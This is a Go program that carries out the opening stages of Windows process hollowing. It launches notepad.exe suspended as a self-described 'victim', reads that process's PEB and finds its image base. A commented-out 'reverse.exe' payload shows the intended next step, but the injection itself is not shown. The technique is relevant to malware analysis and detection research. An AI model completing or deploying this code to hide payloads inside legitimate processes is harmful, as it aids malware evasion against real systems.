package main

import (
	"fmt"
	"log"
	"unsafe"

	"golang.org/x/sys/windows"
)

// Structs definiton for undocumented data structures taken from https://github.com/x64dbg/x64dbg/blob/development/src/dbg/ntdll/ntdll.h
// and https://github.com/winlabs/gowin32/blob/54ddf04f16e612e71c3ebf6cd35da69b652fbbc7/wrappers/winternl.go

type PROCESS_BASIC_INFORMATION struct {
	Reserved1       uintptr
	PebBaseAddress  uintptr
	Reserved2       [2]uintptr
	UniqueProcessID uintptr
	Reserved3       uintptr
}

type PEB struct {
	InheritedAddressSpace    byte
	ReadImageFileExecOptions byte
	BeingDebugged            byte
	BitField                 byte
	Mutant                   uintptr
	ImageBaseAddress         uintptr
	Ldr                      uintptr
	ProcessParameters        uintptr
	Reserved4                [104]byte
	Reserved5                [52]uintptr
	PostProcessInitRoutine   uintptr
	Reserved6                [128]byte
	Reserved7                [1]uintptr
	SessionID                uint32
}

func main() {

	targetProcess := "C:\\Windows\\System32\\notepad.exe" // The process we want to hollow out
	targetProcessUTF16, _ := windows.UTF16FromString(targetProcess)
	//injectedProcess := "reverse.exe" // Our PE payload

	// Start the target process in a suspended state
	var startupInfo windows.StartupInfo
	var processInfo windows.ProcessInformation
	fmt.Println("[+] Starting victim process")
	err := windows.CreateProcess(nil, &targetProcessUTF16[0], nil, nil, true, windows.CREATE_SUSPENDED, nil, nil, &startupInfo, &processInfo)
	defer windows.CloseHandle(processInfo.Process)
	if err != nil {
		fmt.Println("[-] Failed to start victim process")
	}

	fmt.Printf("[+] Started process PID %d\n", processInfo.ProcessId)

	// Try to find victim process' PROCESS_BASIC_INFORMATION
	ntdll := windows.NewLazyDLL("Ntdll.dll")
	ntQueryInformationProcess := ntdll.NewProc("NtQueryInformationProcess")
	var procBasicInfo PROCESS_BASIC_INFORMATION // Cannot use processInfo here, since the windows package does not support this. A buffer this size should do.
	var returnedLength uint32
	r1, _, _ := ntQueryInformationProcess.Call(
		uintptr(processInfo.Process),
		uintptr((uint32)(0)), // ProcessBasicInformation
		uintptr(unsafe.Pointer((*byte)(unsafe.Pointer(&procBasicInfo)))), // Inspired by https://github.com/winlabs/gowin32/blob/master/process.go
		uintptr((uint32)(unsafe.Sizeof(procBasicInfo))),
		uintptr(unsafe.Pointer(&returnedLength)),
	)
	if r1 != 0 {
		log.Fatal("[-] Failed to retrieve victim's PROCESS_BASIC_INFORMATION")
	}
	fmt.Printf("[+] Retrieved PROCESS_BASIC_INFORMATION, returned %d bytes\n", returnedLength)

	// Trying to retrieve PEB
	kernel32DLL := windows.NewLazyDLL("Kernel32.dll")
	readProcessMemory := kernel32DLL.NewProc("ReadProcessMemory")
	var peb PEB
	var bytesRead uint32
	r1, _, _ = readProcessMemory.Call(
		uintptr(processInfo.Process),
		procBasicInfo.PebBaseAddress,
		uintptr(unsafe.Pointer((*byte)(unsafe.Pointer(&peb)))),
		uintptr((uint32)(unsafe.Sizeof(peb))),
		uintptr(unsafe.Pointer(&bytesRead)),
	)
	if r1 == 0 {
		log.Fatal("[-] Failed to retrieve victim's PEB")
	}
	fmt.Printf("[+] Retrieved PEB, read %d bytes\n", bytesRead)
	fmt.Printf("[+] Found the ImageBaseAddress at %p\n", unsafe.Pointer(peb.ImageBaseAddress))

}
